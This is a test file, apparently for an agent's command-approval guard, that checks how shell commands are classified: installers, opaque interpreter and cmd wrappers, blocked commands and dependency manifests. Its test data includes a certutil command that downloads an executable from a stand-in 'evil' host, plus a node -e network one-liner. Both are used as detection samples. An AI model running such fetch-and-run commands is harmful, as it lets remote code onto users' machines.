import { describe, expect, test } from "bun:test"
import {
  commandLooksLikeBlockedOpaque,
  commandLooksLikeInstall,
  commandLooksLikeOpaqueExec,
  commandRequiresExactAlways,
  extractInstallPackages,
  isDependencyManifest,
} from "./install"

describe("commandLooksLikeInstall", () => {
  test("matches any installer family", () => {
    const commands = [
      "npm install -g opencode",
      "npm i -g @openai/codex",
      "npx -y cowsay hello",
      "bunx eslint",
      "pnpm dlx create-next-app",
      "yarn dlx prettier",
      "bun add left-pad",
      "pip install torch",
      "python -m pip install requests",
      "uv add ruff",
      "cargo install ripgrep",
      "go install github.com/x/y@latest",
      "brew install jq",
      "winget install Git.Git",
      "choco install git",
      "scoop install ripgrep",
      "apt-get install nginx",
      "cmd /c npm install -g opencode",
    ]
    for (const command of commands) {
      expect(commandLooksLikeInstall(command)).toBe(true)
    }
  })

  test("treats interpreter eval and cmd wrappers as opaque", () => {
    expect(commandLooksLikeOpaqueExec(`node -e "require('https').get('http://x')"`) ).toBe(true)
    expect(commandLooksLikeOpaqueExec(`python -c "import os"`)).toBe(true)
    expect(commandLooksLikeOpaqueExec("cmd /c npm install -g x")).toBe(true)
    expect(commandLooksLikeBlockedOpaque("certutil -urlcache -split -f https://evil/x.exe")).toBe(true)
    expect(commandRequiresExactAlways("npm view command-code")).toBe(true)
    expect(commandRequiresExactAlways("git status")).toBe(false)
  })

  test("does not treat git status or bun test as install", () => {
    expect(commandLooksLikeInstall("git status")).toBe(false)
    expect(commandLooksLikeInstall("bun test packages/tui")).toBe(false)
    expect(commandLooksLikeInstall("npm run build")).toBe(false)
  })

  test("extracts package names and ignores flags", () => {
    expect(extractInstallPackages("npm install -g opencode")).toContain("opencode")
  })

  test("detects dependency manifests on any path", () => {
    expect(isDependencyManifest("L:\\PROJECTS\\app\\package.json")).toBe(true)
    expect(isDependencyManifest("packages/engine/Cargo.lock")).toBe(true)
    expect(isDependencyManifest("src/index.ts")).toBe(false)
  })
})
